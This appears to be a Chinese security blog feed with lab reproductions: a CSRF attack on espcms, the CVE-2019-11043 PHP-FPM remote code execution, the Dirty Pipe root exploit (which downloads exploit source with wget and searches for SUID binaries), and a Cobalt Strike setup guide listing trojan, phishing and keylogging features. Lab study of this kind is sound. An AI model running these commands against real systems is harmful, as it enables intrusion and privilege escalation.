<li><p>Java环境配置</p>
</li>
<li><p>CSRFTester <a href="https://pan.baidu.com/s/1u8P6OHFZ8L_Zwnk6Z_1msA">点击下载</a> 提取码：<code>kytb</code></p>
</li>
<li><p>espcms：一个存在CSRF的CMS <a href="https://pan.baidu.com/s/1GupNmwEyg7AiRxOPvpTeyg">点击下载</a> 提取码：<code>upg1</code></p>
</li>
</ul>
<h2 id="3、CSRFTester使用"><a href="#3、CSRFTester使用" class="headerlink" title="3、CSRFTester使用"></a>3、CSRFTester使用</h2><p>&emsp;&emsp;安装espcms</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643800362393-66af4eb2-df5f-4072-a8f7-9e925e299609.png" alt="img"></p>
<p>&emsp;&emsp;设置浏览器代理：127.0.0.1:8008</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643800284821-dbf06896-cc97-4999-9d87-a336dffa6fcd.png" alt="img"></p>
<p>&emsp;&emsp;提交表单前，先开启CSRFTester监听</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643800718281-235fb6f9-2dd4-4935-8f09-87fdfa7b7fe2.png" alt="img"></p>
<p>&emsp;&emsp;登录espcms后台，添加一个名为w01ke的会员，提交表单</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643802064658-bed5c7a7-f54b-4353-8d61-ff6a8eacf34a.png" alt="img"></p>
<p>&emsp;&emsp;在CSRFTester里找到提交的表单数据包，将其原来数据修改为admin2数据，然后点击右下角Generate HTML保存到指定目录，会生成一个index.html文件</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643802317726-d4cf6dd2-4680-4dcb-b66d-66eb605758ba.png" alt="img"></p>
<p>&emsp;&emsp;打开index.html将末尾form里面的代码全删除掉</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643815991392-304fc09d-ac0f-4b7d-ad26-6167280c08e4.png" alt="img"></p>
<p>&emsp;&emsp;修改完后，使用同个浏览器打开index.html，页面返回true</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643816018194-09b24420-1692-46f6-99bd-780031e31ae8.png" alt="img"></p>
<p>&emsp;&emsp;再返回查看会员列表页面，可以发现已经成功添加了admin2用户</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643816048642-7d19c578-f2c0-4b3c-99a0-ef0da9bfb1fd.png" alt="img"></p>
<p><strong>【小贴士】</strong>使用CSRFTester工具做测试时，为提供效率，最好只打开要测试的网站页面，也就是在工具中截获的页面尽可能少，否则可能测试结果不准确。  </p>
<h1 id="七、参考链接"><a href="#七、参考链接" class="headerlink" title="七、参考链接"></a>七、参考链接</h1><ul>
<li><a href="https://blog.csdn.net/diubrother/article/details/88366932?spm=1001.2014.3001.5501">https://blog.csdn.net/diubrother/article/details/88366932?spm=1001.2014.3001.5501</a></li>
</ul>
<ul>
<li><a href="http://luckyzmj.cn/posts/a1b686d3.html#">http://luckyzmj.cn/posts/a1b686d3.html#</a></li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2019-11043（PHP远程代码执行漏洞）</title>
    <url>/post/4f87817f.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h1><p>&emsp;&emsp;CVE-2019-11043 是一个远程代码执行漏洞，使用某些特定配置的 Nginx + PHP-FPM 的服务器存在漏洞，可允许攻击者远程执行代码。 </p>
<p>&emsp;&emsp;向Nginx + PHP-FPM的服务器 URL发送 <code>%0a</code> 时，服务器返回异常。</p>
<p>&emsp;&emsp;该漏洞需要在nginx.conf中进行特定配置才能触发。具体配置如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location ~ [^/]\.php(/|$) &#123;</span><br><span class="line">  ...</span><br><span class="line">  fastcgi_split_path_info ^(.+?\.php)(/.*)$;</span><br><span class="line">  fastcgi_param PATH_INFO $fastcgi_path_info;</span><br><span class="line">  fastcgi_pass   php:9000;</span><br><span class="line">  ...</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;攻击者可以使用换行符（％0a）来破坏<code>fastcgi_split_path_info</code>指令中的Regexp。 Regexp被损坏导致PATH_INFO为空，从而触发该漏洞。</p>
<h1 id="二、影响范围"><a href="#二、影响范围" class="headerlink" title="二、影响范围"></a>二、影响范围</h1><p>&emsp;&emsp;在 Nginx + PHP-FPM 环境下，当启用了上述 Nginx 配置后，以下 PHP 版本受本次漏洞影响，另外，PHP 5.6版本也受此漏洞影响，但目前只能 Crash，不可以远程代码执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">● PHP 7.0 版本 </span><br><span class="line">● PHP 7.1 版本 </span><br><span class="line">● PHP 7.2 版本 </span><br><span class="line">● PHP 7.3 版本</span><br></pre></td></tr></table></figure>

<h1 id="三、漏洞复现"><a href="#三、漏洞复现" class="headerlink" title="三、漏洞复现"></a>三、漏洞复现</h1><p>&emsp;&emsp;使用 P 牛的 docker 环境进行复现：</p>
<p>&emsp;&emsp;<a href="https://github.com/vulhub/vulhub/blob/master/php/CVE-2019-11043/README.zh-cn.md">PHP-FPM 远程代码执行漏洞（CVE-2019-11043）</a></p>
<h2 id="1、安装docker、golang环境"><a href="#1、安装docker、golang环境" class="headerlink" title="1、安装docker、golang环境"></a>1、安装docker、golang环境</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install docker docker-compose</span><br><span class="line">sudo apt install golang</span><br></pre></td></tr></table></figure>

<h2 id="2、搭建漏洞环境"><a href="#2、搭建漏洞环境" class="headerlink" title="2、搭建漏洞环境"></a>2、搭建漏洞环境</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/vulhub/vulhub.git</span><br><span class="line"><span class="built_in">cd</span> vulhub/php/CVE-2019-11043 &amp;&amp; docker-compose up -d</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644675505846-fdfd8daf-9d62-492e-ba69-4e7a5018e498.png" alt="img"></p>
<p>​    &emsp;&emsp;启动环境之后，就可以看到漏洞环境的默认页面。在此为<a href="http://127.0.0.1:8080/index.php">http://127.0.0.1:8080/index.php</a></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644675560294-277a1d58-3945-44b8-ba88-0d021a1abc2d.png" alt="img"></p>
<h2 id="3、安装漏洞利用工具"><a href="#3、安装漏洞利用工具" class="headerlink" title="3、安装漏洞利用工具"></a>3、安装漏洞利用工具</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/neex/phuip-fpizdam.git</span><br><span class="line"><span class="built_in">cd</span> phuip-fpizdam</span><br><span class="line">go get -v &amp;&amp; go build</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644676438310-cbcbf0cc-900d-4c55-9923-81a47ca90c2e.png" alt="img"></p>
<p>&emsp;&emsp;报错原因：默认使用的是proxy.golang.org，在国内无法访问</p>
<p>&emsp;&emsp;换一个国内能访问的代理地址：<a href="https://goproxy.cn.重新执行命令即可/">https://goproxy.cn。重新执行命令即可</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">go env -w GOPROXY=https://goproxy.cn</span><br><span class="line">go get -v &amp;&amp; go build</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644676532535-0024811d-a70c-4ab2-a96a-b2c7f16be0f1.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644676576535-b194ee8e-4598-467d-847f-203f67659aca.png" alt="img"></p>
<h2 id="4、漏洞利用"><a href="#4、漏洞利用" class="headerlink" title="4、漏洞利用"></a>4、漏洞利用</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">go run . <span class="string">&quot;http://127.0.0.1:8080/index.php&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644676632793-ceb115ef-9e77-4d35-9593-c94097c87d5d.png" alt="img"></p>
<p>&emsp;&emsp;访问<a href="http://127.0.0.1/index.php?a=id">http://127.0.0.1/index.php?a=id</a></p>
<blockquote>
<p>注意，因为php-fpm会启动多个子进程，在访问/index.php?a=id时需要多访问几次，以访问到被污染的进程。</p>
</blockquote>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644676806166-3e0aa81d-60fc-4aa7-9b2e-92c48c70e6ad.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644677424909-5b744144-fdc4-4ee8-ac4a-6794cdab8d01.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644677611629-8a5bb4d9-4153-4ad3-b16f-1749e935ccbc.png" alt="img"></p>
<blockquote>
<p>curl ip.sb为Linux中查询公网IP的命令</p>
</blockquote>
<h1 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h1><ul>
<li><p><a href="https://github.com/vulhub/vulhub/blob/master/php/CVE-2019-11043/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/php/CVE-2019-11043/README.zh-cn.md</a></p>
</li>
<li><p><a href="https://github.com/neex/phuip-fpizdam">https://github.com/neex/phuip-fpizdam</a></p>
</li>
<li><p><a href="http://blog.leanote.com/post/snowming/9da184ef24bd">http://blog.leanote.com/post/snowming/9da184ef24bd</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>CVE</tag>
        <tag>中间件</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2022-0847 Linux脏管内核提权漏洞复现</title>
    <url>/post/77a28503.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、CVE-2022-0847简介"><a href="#一、CVE-2022-0847简介" class="headerlink" title="一、CVE-2022-0847简介"></a>一、CVE-2022-0847简介</h1><p>危害等级：高</p>
<p>POC/EXP情况：已公开（<a href="https://www.exploit-db.com/exploits/50808%EF%BC%89">https://www.exploit-db.com/exploits/50808）</a></p>
<p>影响范围：Linux内核5.8及以后的版本（<strong>注</strong>：该漏洞已在Linux 5.16.11、5.15.25 和 5.10.102 中修复）</p>
<h1 id="二、漏洞描述"><a href="#二、漏洞描述" class="headerlink" title="二、漏洞描述"></a>二、漏洞描述</h1><p>CVE-2022-0847是自 5.8 以来 Linux 内核中的一个漏洞，攻击者利用该漏洞可以覆盖任意只读文件中的数据。这样将普通的权限提升至root权限，因为非特权进程可以将代码注入到根进程。</p>
<p>CVE-2022-0847类似于 CVE-2016-5195 “Dirty Cow”（脏牛提权），而且容易被利用，网页翻译过来叫脏管道。</p>
<h1 id="三、复现"><a href="#三、复现" class="headerlink" title="三、复现"></a>三、复现</h1><p><strong>【方法一：使用DirtyPipe.sh】</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/imfiver/CVE-2022-0847</span><br><span class="line"><span class="built_in">cd</span> CVE-2022-0847</span><br><span class="line">id  <span class="comment"># 查看当前用户id,确定为普通用户，需要提升权限</span></span><br><span class="line">uname -a  <span class="comment"># 查看当前内核版本，5.10.0大于等于5.8符合本次漏洞利用前提</span></span><br><span class="line">bash ./Dirty-Pipe.sh</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646796891656-0bc49bff-d893-4999-a194-26a88f63459e.png" alt="img"></p>
<p><strong>【方法二：使用dirtypipez.c】</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir dirtypipez</span><br><span class="line"><span class="built_in">cd</span> dirtypipez</span><br><span class="line">wget https://haxx.in/files/dirtypipez.c</span><br><span class="line">gcc dirtypipez.c -o dirtypipez</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646797609959-6654ba54-706c-485b-981b-5192b54b8bd7.png" alt="img"></p>
<p>这个POC需要事先找到一个具有SUID权限的可执行文件，然后利用这个文件进行提权。使用以下命令可以找到这类文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">exec</span> ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646797891376-c6723f29-d3b6-463e-9f05-65e1ce7b38ba.png" alt="img"></p>
<p>这里就以/usr/bin/su为例，直接./dirtypipez跟上具有SUID权限的文件即可提权</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./dirtypipez /usr/bin/su</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646798050081-2bc0d26b-de82-43da-a63c-05e8b204f3dc.png" alt="img"></p>
<h1 id="四、漏洞修复"><a href="#四、漏洞修复" class="headerlink" title="四、漏洞修复"></a>四、漏洞修复</h1><p>更新升级Linux内核到以下安全版本</p>
<ul>
<li><p>Linux内核 &gt;= 5.16.11</p>
</li>
<li><p>Linux内核 &gt;= 5.15.25</p>
</li>
<li><p>Linux内核 &gt;= 5.10.102</p>
</li>
</ul>
<h1 id="五、参考链接"><a href="#五、参考链接" class="headerlink" title="五、参考链接"></a>五、参考链接</h1><ul>
<li><a href="https://mp.weixin.qq.com/s/6VebZCKAv6kkmQme4GCQ_w">https://mp.weixin.qq.com/s/6VebZCKAv6kkmQme4GCQ_w</a></li>
</ul>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>CVE</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>CobaltStrike安装及基本使用与内网渗透</title>
    <url>/post/57d03e3e.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、CobaltStrike简介"><a href="#一、CobaltStrike简介" class="headerlink" title="一、CobaltStrike简介"></a>一、CobaltStrike简介</h1><p>CobaltStrike是一款渗透测试神器，被业界人称为CS神器。CobaltStrike分为客户端与服务端，服务端是一个，客户端可以有多个，可被团队进行分布式协团操作。  </p>
<p>CobaltStrike集成了端口转发、服务扫描，自动化溢出，多模式端口监听，windows exe 木马生成，windows dll 木马生成，java 木马生成，office 宏病毒生成，木马捆绑。钓鱼攻击包括：站点克隆，目标信息获取，java 执行，浏览器自动攻击等等强大的功能！</p>
<p>Cobalt Strike 主要用于团队作战，可谓是团队渗透神器，能让多个攻击者同时连接到团体服务器上，共享攻击资源与目标信息和sessions。</p>
<p>Cobalt Strike 作为一款协同APT工具，针对内网的渗透测试和作为apt的控制终端功能，使其变成众多APT组织的首选。</p>
<h1 id="二、CobaltStrike的安装和启动"><a href="#二、CobaltStrike的安装和启动" class="headerlink" title="二、CobaltStrike的安装和启动"></a>二、CobaltStrike的安装和启动</h1><p>我这里以Kali为例</p>
<h2 id="1、安装java环境"><a href="#1、安装java环境" class="headerlink" title="1、安装java环境"></a>1、安装java环境</h2><p>这里我用的是jdk-8u191-linux-x64.tar.gz，下载链接参照：<a href="https://blog.csdn.net/DeweyLau/article/details/109636906">https://blog.csdn.net/DeweyLau/article/details/109636906</a></p>
<p>注意：java并不是必须要安装到opt目录下，读者可以自行选择</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">上传到Kali中，解压：tar -xzvf jdk-8u191-linux-x64.tar.gz</span><br><span class="line">移动到opt目录下： mv jdk1.8.0_191/ /opt/</span><br><span class="line">进入jdk目录：<span class="built_in">cd</span>  /opt/jdk1.8.0_191</span><br><span class="line"></span><br><span class="line">执行 vim  ~/.bashrc  并添加下列内容</span><br><span class="line"><span class="comment"># install JAVA JDK</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/opt/jdk1.8.0_191</span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$&#123;JAVA_HOME&#125;</span>/lib</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$&#123;JAVA_HOME&#125;</span>/bin:<span class="variable">$PATH</span></span><br><span class="line">保存退出</span><br><span class="line">执行: <span class="built_in">source</span> ~/.bashrc</span><br><span class="line"></span><br><span class="line">执行：</span><br><span class="line">update-alternatives --install /usr/bin/java java /opt/jdk1.8.0_191/bin/java 1</span><br><span class="line">update-alternatives --install /usr/bin/javac javac /opt/jdk1.8.0_191/bin/javac 1</span><br><span class="line">update-alternatives --<span class="built_in">set</span> java /opt/jdk1.8.0_191/bin/java</span><br><span class="line">update-alternatives --<span class="built_in">set</span> javac /opt/jdk1.8.0_191/bin/javac</span><br><span class="line"></span><br><span class="line">查看结果：</span><br><span class="line">update-alternatives --config java</span><br><span class="line">update-alternatives --config javac</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636273734393-8ab0b8dd-b062-4051-bb56-b2b6abf25dd2.png" alt="img"></p>
<p>出现上图情况说明安装成功</p>
<h2 id="2、安装CobalStrike"><a href="#2、安装CobalStrike" class="headerlink" title="2、安装CobalStrike"></a>2、安装CobalStrike</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">上传到Kali中，解压：unzip cobaltstrike-linux.zip</span><br><span class="line">进入cobalstrike中：<span class="built_in">cd</span> cobaltstrike-linux/</span><br></pre></td></tr></table></figure>

<p>一般Cobalt Strike目录结构如下：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636274707738-d661a408-8728-4e2f-8127-3a133a2c2cc1.png" alt="img"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[+] agscript                         拓展应用的脚本</span><br><span class="line">[+] c2lint                           用于检查profile的错误异常</span><br><span class="line">[+] teamserver                       服务端程序</span><br><span class="line">[+] cobaltstrike，cobaltstrike.jar   客户端程序(java跨平台)</span><br><span class="line">[+] license.pdf                      许可证文件</span><br><span class="line">[+] logs                             目录记录与目标主机的相关信息 </span><br><span class="line">[+] update，update.jar               用于更新CS </span><br><span class="line">[+] third-party                      第三方工具</span><br></pre></td></tr></table></figure>

<p>将安装目录解压进入目录后，可以给所有文件赋予777权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod 777 ./*</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636273860708-34edee99-951c-47ca-9dde-b982a6e523a5.png" alt="img"></p>
<h2 id="3、启动服务端"><a href="#3、启动服务端" class="headerlink" title="3、启动服务端"></a>3、启动服务端</h2><p>团队服务器最好运行在Linux平台上，服务端的关键文件是teamserver和cobaltstrike.jar，将这两个文件放在同一目录下运行：  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./teamserver &lt;host&gt; &lt;password&gt; [/path/to/c2.profile] [YYYY-MM-DD]</span><br><span class="line">&lt;host&gt; 必需参数 团队服务器IP</span><br><span class="line">&lt;password&gt; 必需参数 连接服务器的密码</span><br><span class="line">[/path/to/c2.profile] 可选参数 指定C2通信配置文件，体现其强大的扩展性</span><br><span class="line">[YYYY-MM-DD] 可选参数 所有payload的终止时间</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动Team Server</span></span><br><span class="line">sudo ./teamserver [当前开启服务端设备的IP地址] [客户端登录密码] <span class="comment"># 设置强密码，否则容易被爆破，参考附录</span></span><br></pre></td></tr></table></figure>

<p>比如这里我的Kali是部署在内网的，IP地址是192.168.1.104，设置客户端的登录密码为123456</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ./teamserver 192.168.1.104 123456</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636274175735-2e1951f2-0854-4e12-8a46-aa8f343671f7.png" alt="img"></p>
<p>PS：团队服务器默认连接端口为50050，如果你想修改端口只需修改teamserver文件</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636274837524-f2e2dac5-995a-4345-bf82-6364e1d566bd.png" alt="img"></p>
<p>如果运行上述命令出现以下报错信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[-] keytool is not <span class="keyword">in</span> <span class="variable">$PATH</span></span><br><span class="line">    install the Java Developer Kit</span><br></pre></td></tr></table></figure>

<p>明明java已经安装好了，但是一直报错，于是马上检查 keytool 路径，突然发现 keytool 指向的路径是错误的，于是重新配置了一波路径，成功解决</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ln -s /opt/jdk1.8.0_191/bin/keytool /usr/bin/</span><br></pre></td></tr></table></figure>

<p>确定 java 路径，我的是 <code>/opt/jdk1.8.0_191/bin/keytool</code> 于是用上面的命令创建一条软链接。  </p>
<p>注意：如果安装java时跟我安装的不同，上面的路径改成你们当时安装的路径即可</p>
<p>如果提示已存在，可以用 <code>rm -rf ./keytool</code> 命令删除重建</p>
<h2 id="4、客户端连接"><a href="#4、客户端连接" class="headerlink" title="4、客户端连接"></a>4、客户端连接</h2><p>Linux：<code>**./cobaltstrike**</code>或<code>**java -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar**</code></p>
<p>Windows：双击<code>**cobaltstrike.exe**</code></p>
<p>输入服务端IP，端口默认50050，用户名任意，密码为之前设置的密码，点击connect。第一次连接会出现hash校验，这里的hash等于前面的启动teamserver时的hash，直接点击“是”即可连接到团队服务器上。  </p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636277688426-711e26a5-4291-4f4f-92ee-c5ea598aa10b.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636274529055-616a0c26-1a26-4eb9-85ee-734256f9c358.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636275070728-4789f985-3bc5-42a8-8a93-12ffb94aec3e.png" alt="img"></p>
<h1 id="三、参数详解"><a href="#三、参数详解" class="headerlink" title="三、参数详解"></a>三、参数详解</h1><h2 id="1、Cobalt-Strike"><a href="#1、Cobalt-Strike" class="headerlink" title="1、Cobalt Strike"></a>1、Cobalt Strike</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[+] New Connection   <span class="comment"># 新建连接，支持连接多个服务器端</span></span><br><span class="line">[+] Preferences   <span class="comment"># 设置Cobal Strike界面、控制台、以及输出报告样式、TeamServer连接记录</span></span><br><span class="line">[+] Visualization   <span class="comment"># 主要展示输出结果的视图</span></span><br><span class="line">[+] VPN Interfaces   <span class="comment"># 设置VPN接口</span></span><br><span class="line">[+] Listenrs   <span class="comment"># 创建监听器</span></span><br><span class="line">[+] Script Manager   <span class="comment"># 脚本管理，可以通过AggressorScripts脚本来加强自身，能够扩展菜单栏，Beacon命令行，提权脚本等</span></span><br><span class="line">[+] Close   <span class="comment"># 退出连接</span></span><br></pre></td></tr></table></figure>

<h2 id="2、View"><a href="#2、View" class="headerlink" title="2、View"></a>2、View</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[+] Applications   <span class="comment"># 显示受害主机的应用信息</span></span><br><span class="line">[+] Credentials   <span class="comment"># 显示所有以获取的受害主机的凭证，如hashdump、Mimikatz</span></span><br><span class="line">[+] Downloads   <span class="comment"># 查看已下载文件</span></span><br><span class="line">[+] Event Log   <span class="comment"># 主机上线记录以及团队协作聊天记录</span></span><br><span class="line">[+] Keystrokes   <span class="comment"># 查看键盘记录结果</span></span><br><span class="line">[+] Proxy Pivots   <span class="comment"># 查看代理模块</span></span><br><span class="line">[+] Screenshots   <span class="comment"># 查看所有屏幕截图</span></span><br><span class="line">[+] Script Console   <span class="comment"># 加载第三方脚本以增强功能 </span></span><br><span class="line">[+] Targets   <span class="comment"># 显示所有受害主机</span></span><br><span class="line">[+] Web Log    <span class="comment"># 所有Web服务的日志</span></span><br></pre></td></tr></table></figure>

<h2 id="3、Attacks"><a href="#3、Attacks" class="headerlink" title="3、Attacks"></a>3、Attacks</h2><h3 id="（1）Packages"><a href="#（1）Packages" class="headerlink" title="（1）Packages"></a>（1）Packages</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[+] HTML Application   <span class="comment"># 生成(executable/VBA/powershell)这三种原理实现的恶意HTA木马文件</span></span><br><span class="line">[+] MS Office Macro   <span class="comment"># 生成office宏病毒文件</span></span><br><span class="line">[+] Payload Generator   <span class="comment"># 生成各种语言版本的payload</span></span><br><span class="line">[+] USB/CD AutoPlay   <span class="comment"># 生成利用自动播放运行的木马文件</span></span><br><span class="line">[+] Windows Dropper   <span class="comment"># 捆绑器能够对任意的正常文件进行捆绑(免杀效果差)</span></span><br><span class="line">[+] Windows Executable   <span class="comment"># 生成可执行exe木马</span></span><br><span class="line">[+] Windows Executable(Stageless)   <span class="comment"># 生成无状态的可执行exe木马</span></span><br></pre></td></tr></table></figure>

<h3 id="（2）Web-Drive-by"><a href="#（2）Web-Drive-by" class="headerlink" title="（2）Web Drive-by"></a>（2）Web Drive-by</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[+] Manage   <span class="comment"># 对开启的web服务进行管理</span></span><br><span class="line">[+] Clone Site   <span class="comment"># 克隆网站，可以记录受害者提交的数据</span></span><br><span class="line">[+] Host File   <span class="comment"># 提供文件下载，可以选择Mime类型</span></span><br><span class="line">[+] Scripted Web Delivery   <span class="comment"># 为payload提供web服务以便下载和执行，类似于Metasploit的web_delivery </span></span><br><span class="line">[+] Signed Applet Attack   <span class="comment"># 使用java自签名的程序进行钓鱼攻击(该方法已过时)</span></span><br><span class="line">[+] Smart Applet Attack   <span class="comment"># 自动检测java版本并进行攻击，针对Java 1.6.0_45以下以及Java 1.7.0_21以下版本(该方法已过时)</span></span><br><span class="line">[+] System Profiler   <span class="comment"># 用来获取系统信息，如系统版本，Flash版本，浏览器版本等</span></span><br><span class="line">[+] Spear Phish   <span class="comment"># 鱼叉钓鱼邮件</span></span><br></pre></td></tr></table></figure>

<h2 id="4、Reporting"><a href="#4、Reporting" class="headerlink" title="4、Reporting"></a>4、Reporting</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[+] Activity Report   <span class="comment"># 活动报告</span></span><br><span class="line">[+] Hosts Report   <span class="comment"># 主机报告</span></span><br><span class="line">[+] Indicators of Compromise   <span class="comment"># IOC报告：包括C2配置文件的流量分析、域名、IP和上传文件的MD5 hashes</span></span><br><span class="line">[+] Sessions Report   <span class="comment"># 会话报告</span></span><br><span class="line">[+] Social Engineering Report   <span class="comment"># 社会工程报告：包括鱼叉钓鱼邮件及点击记录</span></span><br><span class="line">[+] Tactics, Techniques, and Procedures   <span class="comment"># 战术技术及相关程序报告：包括行动对应的每种战术的检测策略和缓解策略</span></span><br><span class="line">[+] Reset Data   <span class="comment"># 重置数据</span></span><br><span class="line">[+] Export Data   <span class="comment"># 导出数据，导出.tsv文件格式</span></span><br></pre></td></tr></table></figure>

<h2 id="5、Help"><a href="#5、Help" class="headerlink" title="5、Help"></a>5、Help</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[+] Homepage   <span class="comment"># 官方主页</span></span><br><span class="line">[+] Support   <span class="comment"># 技术支持</span></span><br><span class="line">[+] Arsenal   <span class="comment"># 开发者</span></span><br><span class="line">[+] System information   <span class="comment"># 版本信息</span></span><br><span class="line">[+] About   <span class="comment"># 关于</span></span><br></pre></td></tr></table></figure>

<h2 id="6、工具栏"><a href="#6、工具栏" class="headerlink" title="6、工具栏"></a>6、工具栏</h2><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636275820597-c0ef1976-4368-472e-a545-1cd0eb76135a.png" alt="img"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1.新建连接</span><br><span class="line">2.断开当前连接</span><br><span class="line">3.监听器</span><br><span class="line">4.改变视图为Pivot Graph(视图列表)</span><br><span class="line">5.改变视图为Session Table(会话列表)</span><br><span class="line">6.改变视图为Target Table(目标列表)</span><br><span class="line">7.显示所有已获取的受害主机的凭证</span><br><span class="line">8.查看已下载文件</span><br><span class="line">9.查看键盘记录结果</span><br><span class="line">10.查看屏幕截图</span><br><span class="line">11.生成无状态的可执行exe木马</span><br><span class="line">12.使用java自签名的程序进行钓鱼攻击</span><br><span class="line">13.生成office宏病毒文件</span><br><span class="line">14.为payload提供web服务以便下载和执行</span><br><span class="line">15.提供文件下载，可以选择Mime类型</span><br><span class="line">16.管理Cobalt Strike上运行的web服务</span><br><span class="line">17.帮助</span><br><span class="line">18.关于</span><br></pre></td></tr></table></figure>

